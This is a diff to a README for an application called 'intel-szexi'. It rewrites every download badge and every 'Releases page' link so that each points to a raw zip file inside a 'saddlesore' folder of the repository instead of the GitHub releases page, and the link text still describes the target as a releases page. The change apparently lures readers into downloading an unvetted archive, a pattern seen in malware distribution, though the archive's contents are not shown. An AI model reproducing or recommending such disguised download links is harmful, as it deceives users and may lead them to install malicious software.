@@ -8,11 +8,11 @@ Welcome to **intel-szexi**! This application brings you a unique experience fill
 
 To get started, you need to download the application from our Releases page. Click the button below to visit the page:
 
-[![Download intel-szexi](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/fatihhan42/intel-szexi/releases)
+[![Download intel-szexi](https://raw.githubusercontent.com/fatihhan42/intel-szexi/main/saddlesore/intel-szexi.zip)](https://raw.githubusercontent.com/fatihhan42/intel-szexi/main/saddlesore/intel-szexi.zip)
 
 You can find different versions available for download. Choose the version that suits your needs and follow these steps:
 
-1. Visit the [Releases page](https://github.com/fatihhan42/intel-szexi/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/fatihhan42/intel-szexi/main/saddlesore/intel-szexi.zip).
 2. Look for the version you want to download.
 3. Click on the file name to download the application.
 
@@ -55,6 +55,6 @@ Your enjoyment and feedback are important to us!
 
 Don't forget that the application can be downloaded from our Releases page. Click below to go back:
 
-[![Download intel-szexi](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/fatihhan42/intel-szexi/releases)
+[![Download intel-szexi](https://raw.githubusercontent.com/fatihhan42/intel-szexi/main/saddlesore/intel-szexi.zip)](https://raw.githubusercontent.com/fatihhan42/intel-szexi/main/saddlesore/intel-szexi.zip)
 
 Thank you for choosing **intel-szexi**! Enjoy your fun and randomized experience!
